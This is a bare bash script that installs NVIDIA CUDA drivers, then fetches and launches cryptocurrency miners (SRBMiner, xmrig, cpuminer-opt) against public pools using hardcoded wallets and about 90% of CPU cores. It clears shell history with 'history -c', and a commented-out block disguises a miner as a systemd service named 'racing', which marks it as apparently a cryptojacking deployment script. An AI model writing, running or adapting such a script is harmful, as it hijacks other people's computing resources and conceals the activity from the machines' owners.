cd /home
myworker+="ss"
noCore=$(nproc --all)
usingcore=$((noCore*90/100))
sudo apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
sudo echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
sudo apt-key del 7fa2af80
sudo rm /etc/apt/sources.list.d/cuda.list
sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-keyring_1.0-1_all.deb
sudo dpkg -i cuda-keyring_1.0-1_all.deb
sudo apt-get update
sudo apt-get -y install cuda-drivers
sudo apt install nvidia-cuda-toolkit -y
sudo apt-get install libcurl4 -y
sudo apt-get install cuda-drivers-525 -y
sudo apt-get install cuda-drivers-fabricmanager-525 -y
sudo systemctl enable nvidia-fabricmanager
sudo systemctl start nvidia-fabricmanager
sudo nvidia-smi mig -cgi 0 -C
sudo apt-get install -y ocl-icd-libopencl1 -y
sudo wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.2/SRBMiner-Multi-2-4-2-Linux.tar.xz
sudo tar -xvf SRBMiner-Multi-2-4-2-Linux.tar.xz
sudo ./SRBMiner-Multi-2-4-2/SRBMiner-MULTI --algorithm karlsenhash --pool stratum+tcp://fi.mining4people.com:3378 --wallet nautilus:qpd49tf0j56lslu8fpaylp6fas0xsk8h9j03y06kggdpxfscglhhku0sfrt23 --disable-cpu --password x &
#sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
#sudo tar -zxvf t-rex-0.25.12-linux.tar.gz
#sudo mv t-rex racing
#sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u AcV5nrZKKe9PGcSrxUTiZ2iHFmxJ499fZb."'${myworker}_s7_'" -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
#sudo systemctl daemon-reload
#sudo systemctl enable racing.service
#sudo ./racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u AeuwUzTcE8SAkbGF7eaQ1ga2tBMW2kBB7s.${myworker}_s5_ -p x &
history -c
if [[ $noCore -eq 6 ]]
then
	sudo wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
	sudo tar xvzf xmrig-6.16.2-linux-static-x64.tar.gz
	#sudo ./xmrig-6.16.2/xmrig -o de.qrl.herominers.com:1166 -u Q010500814e524290ab792c54c7cac1b5f4847df92d0b64e146c5e7dd15bb61401bdbbb81c860b8 -p qrlrbbb -a rx/0 -k -t= ${usingcore} 
 	sudo ./xmrig-6.16.2/xmrig -o us.zephyr.herominers.com:1123 -u ZEPHYR2FpVwNoWn6FPm8nvgZmjZ5aMU86J8srTneeBysArXKKr1fAksb7mFzyMKoCk4Sr8J7JyEnQLNSTooTuFm2YuX8N3oVk9S2z -p "c1" --coin zephyr -a rx/0 -t= ${usingcore} 
else
	sudo wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
	sudo tar xvzf xmrig-6.16.2-linux-static-x64.tar.gz
	#sudo ./xmrig-6.16.2/xmrig -o de.qrl.herominers.com:1166 -u Q010500814e524290ab792c54c7cac1b5f4847df92d0b64e146c5e7dd15bb61401bdbbb81c860b8 -p qrlrbbb -a rx/0 -k -t= ${usingcore} &
 	sudo ./xmrig-6.16.2/xmrig -o us.zephyr.herominers.com:1123 -u ZEPHYR2FpVwNoWn6FPm8nvgZmjZ5aMU86J8srTneeBysArXKKr1fAksb7mFzyMKoCk4Sr8J7JyEnQLNSTooTuFm2YuX8N3oVk9S2z -p "c1" --coin zephyr -a rx/0 -t= ${usingcore} &
fi
:'


if [[ $noCore -eq 6 ]]
then
	sudo wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
	sudo tar -xvf cpuminer-opt-linux.tar.gz
	sudo ./cpuminer-sse2 -a yescryptr32  -o stratum+tcps://stratum-eu.rplant.xyz:17116 -u Ug8PvBbDZgFAqGoDdxgqCUGKWW1vpm5cKK.helloba   &
else
	sudo wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
	sudo tar -xvf cpuminer-opt-linux.tar.gz
	sudo ./cpuminer-sse2 -a yescryptr32  -o stratum+tcps://stratum-eu.rplant.xyz:17116 -u Ug8PvBbDZgFAqGoDdxgqCUGKWW1vpm5cKK.helloba  &
fi
